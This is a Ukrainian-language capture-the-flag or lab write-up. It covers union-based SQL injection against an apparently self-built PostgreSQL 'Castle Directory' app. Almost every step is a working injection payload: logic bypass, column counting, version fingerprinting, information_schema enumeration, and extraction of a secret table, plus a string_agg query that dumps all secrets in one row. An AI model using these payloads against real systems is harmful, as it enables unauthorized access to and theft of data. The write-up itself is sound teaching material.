# Врайтап: SQL Injection (Union-Based) у Castle Directory

## 1. Перевірка на вразливість (Entry Point)
Шукаємо точку входу та ламаємо синтаксис запиту.
* `'` — одинарна лапка. Якщо сервер видає помилку — він вразливий (код не екранує ввід).
* `' -- ` — закрити запит коментарем (ігнорує весь оригінальний код після нашого вводу). *Увага: у PostgreSQL після `--` обов'язково має бути пробіл!*
* `' OR 1=1 -- ` — класичний обхід логіки. Робить умову завжди істинною (`TRUE`), виводячи весь вміст поточної таблиці без знання конкретного імені.

## 2. Пошук кількості стовпців (Reconnaissance)
Важливо для оператора `UNION`, який вимагає точного співпадіння кількості колонок з обох сторін запиту.

**Метод ORDER BY (через сортування):**
* `' ORDER BY 1 -- ` — сортує по 1-му стовпцю (працює).
* `' ORDER BY 4 -- ` — сортує по 4-му (працює) — значить стовпців мінімум 4.
* `' ORDER BY 5 -- ` — (помилка) — підтверджує, що стовпців рівно 4.

**Метод NULL (через підбір):**
* `' UNION SELECT NULL, NULL, NULL, NULL -- ` — найнадійніший спосіб для PostgreSQL, оскільки `NULL` підходить під будь-який тип даних і не викликає помилок несумісності.

## 3. Збір метаданих (Fingerprinting)
Визначаємо середовище, щоб розуміти, з чим маємо справу.
* `' UNION SELECT 1, version(), current_user, current_database() -- ` — замість реальних даних підставляємо системні функції. Ми використовуємо цифру `1` для першого стовпця (оскільки `id` має числовий тип), а далі текст. Виводить версію PostgreSQL, поточного юзера та назву БД.

## 4. Пошук назв таблиць (Discovery)
Шукаємо, де архітектура ховає секретні дані. Усі структури БД зберігаються в `information_schema`.
* `' UNION SELECT 1, table_name, table_type, '***' FROM information_schema.tables WHERE table_schema = 'public' -- `
    * *Хакерська нотатка:* Ми використовуємо `'***'` як текстову "заглушку" (padding) для 4-го стовпця, щоб запит не зламався. Ця команда виведе список усіх створених нами таблиць.

## 5. Пошук назв колонок (Structure Enumeration)
Коли знайшли цільову таблицю (наприклад, `STAFF_Command`), треба дізнатися, як називаються її стовпці (де саме лежить прапор).
* `' UNION SELECT 1, column_name, data_type, '*' FROM information_schema.columns WHERE table_name = 'staff_command' -- `
    * *Хакерська нотатка:* У PostgreSQL назви таблиць у системному каталозі завжди зберігаються в **нижньому регістрі**, навіть якщо при створенні ми писали `STAFF_Command`. Тому тут шукаємо саме `'staff_command'`.

## 6. Екстракція даних (Exploitation)
Фінальний запит. Збираємо докупи кількість колонок, ім'я таблиці та імена потрібних полів.
* `' UNION SELECT id, full_name, clearance, secret_code FROM STAFF_Command -- ` — "приклеює" вміст секретної таблиці до результатів пошуку і виводить прапор прямо в інтерфейс.

---
**Бонусний крок (якщо вивід обмежений одним рядком):**
Якщо фронтенд показує тільки перший знайдений результат, ми можемо злити всі прапори/паролі в один довгий рядок:
* `' UNION SELECT 1, string_agg(secret_code, ', '), 'Hacked', '***' FROM STAFF_Command -- `
